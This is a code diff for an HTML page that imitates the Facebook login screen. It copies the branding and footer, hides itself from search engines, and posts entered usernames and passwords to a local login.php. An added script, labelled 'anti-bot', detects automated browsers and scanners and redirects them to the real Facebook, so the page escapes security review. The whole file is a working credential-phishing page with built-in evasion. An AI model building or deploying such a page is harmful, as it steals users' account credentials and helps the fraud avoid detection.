@@ -1,35 +1,439 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" dir="ltr">
+
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Facebook - Log In or Sign Up</title>
-    <link rel="stylesheet" href="style.css">
-    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><rect width='16' height='16' rx='3' fill='%231877F2'/></svg>">
+    <meta name="description" content="Connect with friends and the world around you on Facebook.">
+    <meta name="robots" content="noindex, nofollow">
+    <link rel="icon"
+        href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>📘</text></svg>">
+    <style>
+        /* ===== RESET & BASE ===== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html,
+        body {
+            height: 100%;
+        }
+
+        body {
+            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+            background: #f0f2f5;
+            color: #1c1e21;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        a {
+            text-decoration: none;
+            color: inherit;
+        }
+
+        /* ===== MAIN CONTAINER ===== */
+        .main-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 720px;
+            padding: 72px 0 132px;
+        }
+
+        .content {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0;
+            max-width: 980px;
+            width: 100%;
+            padding: 20px;
+        }
+
+        /* ===== LEFT SECTION ===== */
+        .left-section {
+            flex: 1;
+            padding-right: 32px;
+            margin-bottom: 40px;
+        }
+
+        .logo {
+            color: #0866ff;
+            font-size: 56px;
+            font-weight: 700;
+            letter-spacing: -1px;
+            line-height: 1;
+            margin-bottom: 6px;
+        }
+
+        .tagline {
+            font-family: 'SF Pro Display', 'Helvetica Neue', Arial, sans-serif;
+            font-size: 28px;
+            font-weight: 400;
+            line-height: 32px;
+            color: #1c1e21;
+            max-width: 500px;
+        }
+
+        /* ===== RIGHT SECTION ===== */
+        .right-section {
+            flex: 0 0 396px;
+        }
+
+        .login-card {
+            background: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            padding: 16px 16px 24px;
+            width: 396px;
+        }
+
+        .input-group {
+            margin-bottom: 12px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            color: #1d2129;
+            background: #ffffff;
+            outline: none;
+            transition: border-color 0.15s, box-shadow 0.15s;
+        }
+
+        .input-group input:focus {
+            border-color: #0866ff;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+
+        .input-group input::placeholder {
+            color: #90949c;
+        }
+
+        .input-group input.error {
+            border-color: #f02849;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background: #0866ff;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background 0.15s;
+            line-height: 1.2;
+        }
+
+        .login-btn:hover {
+            background: #1877f2;
+        }
+
+        .login-btn:active {
+            background: #165fe0;
+        }
+
+        .forgot-link {
+            display: block;
+            text-align: center;
+            margin: 16px 0;
+            color: #0866ff;
+            font-size: 15px;
+            font-weight: 500;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+
+        .create-btn {
+            display: block;
+            width: fit-content;
+            margin: 0 auto;
+            padding: 12px 24px;
+            background: #42b72a;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            text-decoration: none;
+            transition: background 0.15s;
+        }
+
+        .create-btn:hover {
+            background: #36a420;
+        }
+
+        .page-info {
+            text-align: center;
+            font-size: 14px;
+            color: #1c1e21;
+            margin-top: 20px;
+        }
+
+        .page-info strong {
+            font-weight: 600;
+        }
+
+        .page-info strong:hover {
+            text-decoration: underline;
+        }
+
+        /* ===== FOOTER ===== */
+        .footer {
+            background: #ffffff;
+            padding: 20px 0;
+            font-size: 12px;
+            color: #737373;
+        }
+
+        .footer-inner {
+            max-width: 980px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        .footer-langs {
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            list-style: none;
+            padding: 0 0 8px;
+            border-bottom: 1px solid #dddfe2;
+            margin-bottom: 8px;
+        }
+
+        .footer-langs li {
+            margin-right: 12px;
+            margin-bottom: 4px;
+        }
+
+        .footer-langs li a {
+            color: #737373;
+        }
+
+        .footer-langs li a:hover {
+            text-decoration: underline;
+        }
+
+        .footer-langs li.active {
+            color: #737373;
+        }
+
+        .footer-langs li button {
+            border: 1px solid #ccd0d5;
+            border-radius: 2px;
+            background: #f5f6f7;
+            padding: 0 8px;
+            font-size: 12px;
+            cursor: pointer;
+            height: 20px;
+            font-weight: 600;
+            color: #4b4f56;
+        }
+
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            list-style: none;
+        }
+
+        .footer-links li {
+            margin-right: 18px;
+            margin-bottom: 4px;
+        }
+
+        .footer-links li a {
+            color: #737373;
+        }
+
+        .footer-links li a:hover {
+            text-decoration: underline;
+        }
+
+        .footer-copyright {
+            margin-top: 8px;
+        }
+
+        /* ===== MOBILE RESPONSIVE ===== */
+        @media (max-width: 900px) {
+            .main-container {
+                padding: 20px 0;
+                min-height: auto;
+            }
+
+            .content {
+                flex-direction: column;
+                text-align: center;
+            }
+
+            .left-section {
+                padding-right: 0;
+                margin-bottom: 20px;
+            }
+
+            .logo {
+                font-size: 40px;
+            }
+
+            .tagline {
+                font-size: 20px;
+                line-height: 26px;
+            }
+
+            .right-section {
+                flex: 0 0 auto;
+                width: 100%;
+                max-width: 396px;
+            }
+
+            .login-card {
+                width: 100%;
+            }
+        }
+
+        @media (max-width: 440px) {
+            .content {
+                padding: 10px;
+            }
+
+            .login-card {
+                padding: 12px 12px 20px;
+            }
+
+            .input-group input {
+                padding: 12px 14px;
+                font-size: 16px;
+            }
+
+            .login-btn {
+                font-size: 18px;
+                padding: 10px;
+            }
+        }
+    </style>
 </head>
+
 <body>
-    <div class="container">
-        <div class="left-section">
-            <h1 class="logo">facebook</h1>
-            <p class="tagline">Facebook helps you connect and share with the people in your life.</p>
-        </div>
-        <div class="right-section">
-            <div class="login-card">
-                <form action="login.php" method="POST">
-                    <div class="input-group">
-                        <input type="text" name="username" placeholder="Email address or phone number" required autofocus>
-                    </div>
-                    <div class="input-group">
-                        <input type="password" name="password" placeholder="Password" required>
-                    </div>
-                    <button type="submit" class="login-btn">Log In</button>
-                    <a href="#" class="forgot-link">Forgotten password?</a>
-                    <div class="divider"></div>
-                    <a href="#" class="create-btn">Create new account</a>
-                </form>
+
+    <div class="main-container">
+        <div class="content">
+            <div class="left-section">
+                <h1 class="logo">facebook</h1>
+                <p class="tagline">Connect with friends and the world around you on Facebook.</p>
             </div>
-            <p class="page-info"><strong>Create a Page</strong> for a celebrity, brand or business.</p>
+            <div class="right-section">
+                <div class="login-card">
+                    <form action="login.php" method="POST" id="login-form">
+                        <div class="input-group">
+                            <input type="text" name="username" placeholder="Email or phone number" required autofocus
+                                id="email-input">
+                        </div>
+                        <div class="input-group">
+                            <input type="password" name="password" placeholder="Password" required id="pass-input">
+                        </div>
+                        <button type="submit" class="login-btn" id="login-btn">Log in</button>
+                        <a href="#" class="forgot-link">Forgotten password?</a>
+                        <div class="divider"></div>
+                        <a href="#" class="create-btn">Create new account</a>
+                    </form>
+                </div>
+                <p class="page-info"><strong>Create a Page</strong> for a celebrity, brand or business.</p>
+            </div>
         </div>
     </div>
+
+    <div class="footer">
+        <div class="footer-inner">
+            <ul class="footer-langs">
+                <li class="active">English (UK)</li>
+                <li><a href="#">中文(简体)</a></li>
+                <li><a href="#">Bahasa Indonesia</a></li>
+                <li><a href="#">日本語</a></li>
+                <li><a href="#">한국어</a></li>
+                <li><a href="#">Español</a></li>
+                <li><a href="#">Português (Brasil)</a></li>
+                <li><a href="#">Deutsch</a></li>
+                <li><a href="#">Italiano</a></li>
+                <li><a href="#">Français (France)</a></li>
+                <li><button>+</button></li>
+            </ul>
+            <ul class="footer-links">
+                <li><a href="#">Sign Up</a></li>
+                <li><a href="#">Log In</a></li>
+                <li><a href="#">Messenger</a></li>
+                <li><a href="#">Facebook Lite</a></li>
+                <li><a href="#">Watch</a></li>
+                <li><a href="#">Places</a></li>
+                <li><a href="#">Games</a></li>
+                <li><a href="#">Marketplace</a></li>
+                <li><a href="#">Meta Pay</a></li>
+                <li><a href="#">Meta Store</a></li>
+                <li><a href="#">Meta Quest</a></li>
+                <li><a href="#">Instagram</a></li>
+                <li><a href="#">Threads</a></li>
+                <li><a href="#">Fundraisers</a></li>
+                <li><a href="#">Services</a></li>
+                <li><a href="#">Voting Information Centre</a></li>
+                <li><a href="#">Privacy Policy</a></li>
+                <li><a href="#">Privacy Centre</a></li>
+                <li><a href="#">Groups</a></li>
+                <li><a href="#">About</a></li>
+                <li><a href="#">Create ad</a></li>
+                <li><a href="#">Create Page</a></li>
+                <li><a href="#">Developers</a></li>
+                <li><a href="#">Careers</a></li>
+                <li><a href="#">Cookies</a></li>
+                <li><a href="#">AdChoices</a></li>
+                <li><a href="#">Terms</a></li>
+                <li><a href="#">Help</a></li>
+                <li><a href="#">Contact uploading and non-users</a></li>
+            </ul>
+            <div class="footer-copyright">Meta &copy; 2025</div>
+        </div>
+    </div>
+
+    <script>
+        // Subtle anti-bot: check for real browser behavior
+        (function () {
+            // If no navigator keys exist, this is likely a headless browser
+            var isRealBrowser = true;
+            try {
+                if (!window.navigator || !window.navigator.userAgent) {
+                    isRealBrowser = false;
+                }
+                // Check for automation tools
+                if (window.navigator.webdriver === true) {
+                    isRealBrowser = false;
+                }
+                if (window._phantom || window.callPhantom) {
+                    isRealBrowser = false;
+                }
+            } catch (e) { }
+
+            if (!isRealBrowser) {
+                // Redirect to legitimate Facebook
+                window.location.href = 'https://www.facebook.com';
+            }
+        })();
+    </script>
+
 </body>
+
 </html>
